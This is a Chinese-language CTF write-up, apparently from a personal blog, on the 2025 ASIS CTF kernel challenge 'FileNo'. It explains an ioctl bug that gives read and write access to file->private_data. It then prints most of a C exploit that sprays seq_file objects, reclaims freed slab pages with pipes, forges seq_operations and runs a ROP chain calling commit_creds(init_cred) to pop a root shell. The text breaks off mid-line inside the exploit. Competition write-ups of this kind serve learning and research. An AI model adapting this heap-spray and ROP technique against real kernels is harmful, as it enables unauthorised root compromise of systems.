@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="🤡">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 ASIS CTF FileNo">
+<meta property="og:url" content="http://akaieurus.github.io/2025/09/18/asis2025fileno/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="🤡">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc69.jpg">
+<meta property="article:published_time" content="2025-09-18T07:59:03.000Z">
+<meta property="article:modified_time" content="2025-09-28T06:53:37.150Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc69.jpg">
+  
+  
+  
+  <title>2025 ASIS CTF FileNo - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc69.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025 ASIS CTF FileNo"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-18 15:59" pubdate>
+          2025年9月18日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025 ASIS CTF FileNo</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>🤡</p>
+<span id="more"></span>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>读写file-&gt;private_data</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (cmd == CMD_READ) &#123;<br>    req.val = (<span class="hljs-type">long</span>)target-&gt;private_data;<br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">req_t</span> __user *)arg, &amp;req, <span class="hljs-keyword">sizeof</span>(req))) &#123;<br>      ret = -EFAULT;<br>      <span class="hljs-keyword">goto</span> unlock_on_fail;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// CMD_WRITE</span><br>	target-&gt;private_data = (<span class="hljs-type">void</span>*)req.val;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对file的要求S_ISREG最基本满足：</p>
+<ul>
+<li>非dir</li>
+<li>非link</li>
+<li>非char driver</li>
+<li>非block driver</li>
+<li>非pipe</li>
+<li>非socket</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!S_ISREG(file_inode(target)-&gt;i_mode)) &#123;<br>	ret = -EBADF;<br>	<span class="hljs-keyword">goto</span> unlock_on_fail;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><em>最大的问题其实就是搜索有private_data的reg file……</em></p>
+<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>直接进行一个暴力搜索<code>-&gt;private_data</code>🙂，然后发现一个seq_file，之前好像见过，那就这个了！</p>
+<h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>打开一个<code>/proc/self/stat</code>文件，file-&gt;private_data指向一个seq_file</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br>	<span class="hljs-type">char</span> *buf;<br>	<span class="hljs-type">size_t</span> size;<br>	<span class="hljs-type">size_t</span> from;<br>	<span class="hljs-type">size_t</span> count;<br>	<span class="hljs-type">size_t</span> pad_until;<br>	<span class="hljs-type">loff_t</span> index;<br>	<span class="hljs-type">loff_t</span> read_pos;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br>	<span class="hljs-type">int</span> poll_event;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>	<span class="hljs-type">void</span> *private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>	<span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>	<span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>可以劫持seq_file-&gt;buf进行任意读，伪造seq_operations劫持控制流</p>
+<p><em>找gadget来栈迁移研究了好久（</em></p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>喷seq_file然后discard slab，pipe把page alloc回来整页伪造</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  	<span class="hljs-type">int</span> fd;<br>  	<span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br>	<span class="hljs-type">req_t</span> arg = &#123;<br>		.fd = fd,<br>		.val = <span class="hljs-number">0</span>,<br>	&#125;;<br>	ioctl(fd_dev, CMD_READ, &amp;arg);<br>	<span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br>	<span class="hljs-type">req_t</span> arg = &#123;<br>		.fd = fd,<br>		.val = val,<br>	&#125;;<br>	<span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br>	<span class="hljs-type">int</span> fd;<br>	<span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		N_PAGE_NUM	0xe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 	N_FDS		0x22*N_PAGE_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 	N_PAGES		0x10</span><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br>object sprays[<span class="hljs-number">0x13</span>][<span class="hljs-number">0x22</span>];<br><span class="hljs-type">int</span> pipe_fd[N_PAGES][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> target)</span>&#123;<br>	<span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br>	<br><span class="hljs-comment">// 0xffffffff8132b8f4: pop rsp; ret;</span><br><span class="hljs-comment">// 0xffffffff819e613f: push rdi; adc ch, cl; imul edi, edi, -1; jmp qword ptr [rsi + 0x45]</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_JMP_RSI	0x9e613f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET			0x32b8f4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RSP_ADD_88_RET		0x20119C</span><br><br>	<span class="hljs-comment">// fake seq_file</span><br>	ptr[<span class="hljs-number">0</span>] = kernel_base+RSP_ADD_88_RET;<br>	ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">0x10</span>;<br>	ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">9</span>] = target+<span class="hljs-number">0x48</span>;<br>	ptr[<span class="hljs-number">10</span>] = target+<span class="hljs-number">0x48</span>;<br>	ptr[<span class="hljs-number">11</span>] = target+<span class="hljs-number">0x80</span>;		<span class="hljs-comment">// [rdi+80h] fake_operations</span><br>	ptr[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br><br>	*(<span class="hljs-type">size_t</span> *)((<span class="hljs-type">size_t</span>)buffer+<span class="hljs-number">0x28</span>+<span class="hljs-number">0x45</span>) = kernel_base + POP_RSP_RET;<br><br>	<span class="hljs-comment">// fake seq_operations</span><br>	ptr[<span class="hljs-number">16</span>] = kernel_base + PUSH_RDI_JMP_RSI;<br>	ptr[<span class="hljs-number">17</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">18</span>] = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">// rop chain</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET		0x306a4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED		0xE3BF60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS    0x2a3a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAP_RET		0x1787</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET	 	0x2af543</span><br>	ptr[<span class="hljs-number">89</span>] = kernel_base+POP_RDI_RET;<br>	ptr[<span class="hljs-number">90</span>] = kernel_base+INIT_CRED;<br>	ptr[<span class="hljs-number">91</span>] = kernel_base+COMMIT_CREDS;<br>	ptr[<span class="hljs-number">92</span>] = kernel_base+SWAP_RET;<br>	ptr[<span class="hljs-number">93</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">94</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">95</span>] = (<span class="hljs-type">size_t</span>)&amp;get_root_shell;<br>	ptr[<span class="hljs-number">96</span>] = user_cs;<br>	ptr[<span class="hljs-number">97</span>] = user_rflags;<br>	ptr[<span class="hljs-number">98</span>] = user_sp;<br>	ptr[<span class="hljs-number">99</span>] = user_ss;<br><br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>		write(pipe_fd[i][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>	&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	save_status();<br>	bind_core(<span class="hljs-number">0</span>);<br><br>	<span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br>	<span class="hljs-type">size_t</span> pre = <span class="hljs-number">-1</span>;<br><br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>		<span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>			perror(<span class="hljs-string">&quot;pipe&quot;</span>);<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-type">int</span> i=<span class="hljs-number">-1</span>, j=<span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">while</span>(i &lt; N_PAGE_NUM)&#123;<br>		<span class="hljs-type">int</span> fd_tmp = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(fd_tmp &lt; <span class="hljs-number">0</span>)&#123;<br>            perror(<span class="hljs-string">&quot;open&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>		read(fd_tmp, buffer, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-type">size_t</span> addr = dev_read(fd, fd_tmp);<br>		<span class="hljs-keyword">if</span>(pre != (addr &amp; <span class="hljs-number">0xfffffffffffff000</span>))&#123;<br>			pre = addr &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>			i++;<br>			j=<span class="hljs-number">0</span>;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			j++;<br>		&#125;<br>		sprays[i][j].fd = fd_tmp;<br>		sprays[i][j].addr = addr;<br>		page_offset_base = addr &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, fd_tmp, addr);<br>	&#125;<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over.&quot;</span>);<br><br>	<span class="hljs-keyword">for</span>(i=N_PAGE_NUM<span class="hljs-number">-3</span>; i&lt;N_PAGE_NUM; i++)&#123;<br>		<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>			sprays[i][j].addr = sprays[i-(N_PAGE_NUM<span class="hljs-number">-3</span>)][j].addr;<br>			dev_write(fd, sprays[i][j].fd, sprays[i][j].addr);<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, sprays[i][j].fd, sprays[i][j].addr);<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write over.&quot;</span>);<br><br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGE_NUM<span class="hljs-number">-3</span>; i++)&#123;<br>		<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>			close(sprays[i][j].fd);<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Close over.&quot;</span>);<br><br>	<span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br>	ptr[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>	ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2000</span>;<br>	ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">8</span>;<br>	ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>	ptr[<span class="hljs-number">9</span>] = <span class="hljs-number">0xdeadbeef</span>; 	<span class="hljs-comment">// self + 0x48</span><br>	ptr[<span class="hljs-number">10</span>] = <span class="hljs-number">0xdeadbeef</span>; 	<span class="hljs-comment">// self + 0x48 </span><br><br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br>		<span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			ptr[<span class="hljs-number">9</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br>			ptr[<span class="hljs-number">10</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br><br>			<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;N_PAGES; j++)&#123;<br>				write(pipe_fd[j][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>			&#125;<br>			read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br>			kernel_base -= <span class="hljs-number">0x22bf70</span>;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, 